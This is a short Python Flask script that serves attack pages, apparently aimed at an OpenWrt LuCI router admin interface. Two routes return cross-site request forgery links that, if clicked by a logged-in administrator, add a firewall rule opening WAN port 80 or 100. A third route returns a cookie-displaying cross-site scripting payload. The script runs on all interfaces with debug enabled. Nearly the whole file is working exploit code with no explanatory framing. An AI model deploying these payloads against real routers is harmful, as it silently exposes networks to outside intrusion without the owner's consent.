#!/user/bin/python
from flask import Flask

app = Flask(__name__)
app.debug=True

@app.route('/')
def hello_world():
    return '<br><a href=/csrf80>the csrf string</></><br><a href=/xss></>the xss payload</>'

@app.route('/csrf80')
def csrf():
    return '<a href=http://172.30.254.1/cgi-bin/luci/;stok=a/admin/network/firewall/rules/?cbi.cbe.firewall.cfg0892bd.enabled=1&_newopen.extport=80&_newfwd.dest=wan&cbi.cbe.firewall.cfg0a92bd.enabled=1&cbi.submit=1&cbi.sts.firewall.redirect=&cbid.firewall.cfg0292bd.enabled=1&cbi.cbe.firewall.cfg0492bd.enabled=1&cbid.firewall.cfg0a92bd.enabled=1&_newsnat.dport=&_newsnat.dip=1&cbid.firewall.cfg0692bd.enabled=1&_newsnat.dest=wan&cbid.firewall.cfg0892bd.enabled=1&_newsnat.src=lan&_newfwd.src=lan&cbi.cbe.firewall.cfg0692bd.enabled=1&cbi.cbe.firewall.cfg0292bd.enabled=1&_newsnat.name=&_newopen.submit=Add&_newfwd.name=&_newopen.proto=tcp&_newopen.name=tfive&cbid.firewall.cfg0492bd.enabled=1&cbi.sts.firewall.rule=&cbi.apply=Save & Apply>csrf</>'

@app.route('/csrf100')
def csrf2():
    return '<a href=http://172.30.254.1/cgi-bin/luci/;stok=a/admin/network/firewall/rules/?cbi.cbe.firewall.cfg0892bd.enabled=1&_newopen.extport=100&_newfwd.dest=wan&cbi.cbe.firewall.cfg0a92bd.enabled=1&cbi.submit=1&cbi.sts.firewall.redirect=&cbid.firewall.cfg0292bd.enabled=1&cbi.cbe.firewall.cfg0492bd.enabled=1&cbid.firewall.cfg0a92bd.enabled=1&_newsnat.dport=&_newsnat.dip=1&cbid.firewall.cfg0692bd.enabled=1&_newsnat.dest=wan&cbid.firewall.cfg0892bd.enabled=1&_newsnat.src=lan&_newfwd.src=lan&cbi.cbe.firewall.cfg0692bd.enabled=1&cbi.cbe.firewall.cfg0292bd.enabled=1&_newsnat.name=&_newopen.submit=Add&_newfwd.name=&_newopen.proto=tcp&_newopen.name=tfive&cbid.firewall.cfg0492bd.enabled=1&cbi.sts.firewall.rule=&cbi.apply=Save & Apply>csrf</>'

@app.route('/xss')
def xss():
    return '<script>document.write(document.cookie)</script>'


if __name__ == '__main__':
    #app.run(port=5000)
    app.run(port=80, host='0.0.0.0') #to allow remote hosts

